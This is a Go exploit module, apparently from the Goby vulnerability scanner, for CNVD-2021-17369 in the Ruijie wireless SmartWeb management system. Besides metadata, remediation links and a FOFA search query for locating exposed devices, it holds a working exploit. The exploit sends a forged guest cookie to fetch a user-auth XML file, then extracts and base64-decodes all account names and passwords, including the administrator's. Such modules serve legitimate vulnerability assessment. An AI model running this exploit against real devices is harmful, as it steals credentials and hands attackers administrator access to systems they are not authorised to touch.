package exploits

import (
	"bytes"
	"encoding/base64"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
)

func init() {
	expJson := `{
    "Name": "Ruijie wireless SmartWeb infoleak (CNVD-2021-17369)",
    "Description": "Ruijie wireless SmartWeb management System allow low-privilege user reading a file that contains other accounts and passwords.",
    "Impact": "Ruijie wireless SmartWeb infoleak (CNVD-2021-17369)",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. 2. If not necessary, prohibit public network access to the system. </p><p>3. The manufacturer has provided a vulnerability patching solution, it is recommended that users download and use: <a href=\"http://www.ruijie.com.cn/gy/xw-aqtg-zw/83722/\">http://www.ruijie.com.cn/gy/xw-aqtg-zw/83722/</a>. </p>",
    "Product": "Ruijie Wireless SmartWeb",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "锐捷网络股份有限公司无线smartweb管理系统存在逻辑缺陷漏洞",
            "Description": "锐捷网络股份有限公司无线smartweb管理系统存在逻辑缺陷漏洞，攻击者可从漏洞获取到管理员账号密码，从而以管理员权限登录。",
            "Impact": "<p>攻击者可从低权限用户获取到管理员账号密码，从而从低权限提升到管理员权限。</p>",
            "Recommendation": "<p>1.通过防火墙等安全设备设置访问策略，设置白名单访问。<br>2.如非必要，禁止公网访问该系统。<br></p><p>3.厂商已提供漏洞修补方案，建议用户下载使用：<a href=\"http://www.ruijie.com.cn/gy/xw-aqtg-zw/83722/\" rel=\"nofollow\">http://www.ruijie.com.cn/gy/xw-aqtg-zw/83722/</a>。</p>",
            "Product": "锐捷Smartweb管理系统",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Ruijie wireless SmartWeb infoleak (CNVD-2021-17369)",
            "Description": "Ruijie wireless SmartWeb management System allow low-privilege user reading a file that contains other accounts and passwords.",
            "Impact": "Ruijie wireless SmartWeb infoleak (CNVD-2021-17369)",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. <br>2. If not necessary, prohibit public network access to the system. <br></p><p>3. The manufacturer has provided a vulnerability patching solution, it is recommended that users download and use: <a href=\"http://www.ruijie.com.cn/gy/xw-aqtg-zw/ 83722/\" rel=\"nofollow\">http://www.ruijie.com.cn/gy/xw-aqtg-zw/83722/</a>. </p>",
            "Product": "Ruijie Wireless SmartWeb",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "title=\"无线smartWeb--登录页面\"",
    "GobyQuery": "title=\"无线smartWeb--登录页面\"",
    "Author": "ovi3",
    "Homepage": "http://www.ruijie.com.cn/",
    "DisclosureDate": "2021-12-12",
    "References": [
        "https://www.cnvd.org.cn/flaw/show/CNVD-2021-17369"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "5.0",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-2021-17369"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/web/xml/webuser-auth.xml",
                "follow_redirect": false,
                "header": {
                    "Cookie": "login=1; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<userauth><user><name><![CDATA[   admin]]></name><password>",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/web/xml/webuser-auth.xml",
                "follow_redirect": false,
                "header": {
                    "Cookie": "login=1; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<userauth><user><name><![CDATA[   admin]]></name><password>",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10190"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cfg := httpclient.NewGetRequestConfig("/web/xml/webuser-auth.xml")
			cfg.VerifyTls = false
			cfg.Header.Store("Cookie", "login=1; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					reg := regexp.MustCompile(`<name><!\[CDATA\[\s*(.*?)]]></name><password><!\[CDATA\[\s*(.*?)]]></password>`)
					matches := reg.FindAllStringSubmatch(resp.RawBody, -1)
					if matches != nil {
						var buffer bytes.Buffer
						for i := 0; i < len(matches); i++ {
							password, err := base64.StdEncoding.DecodeString(matches[i][2])
							if err == nil {
								buffer.WriteString(string(password) + "\n")
							} else {
								buffer.WriteString(matches[i][2] + "\n")
							}
						}
						expResult.Success = true
						expResult.Output = buffer.String()
					}
				}
			}
			return expResult
		},
	))
}
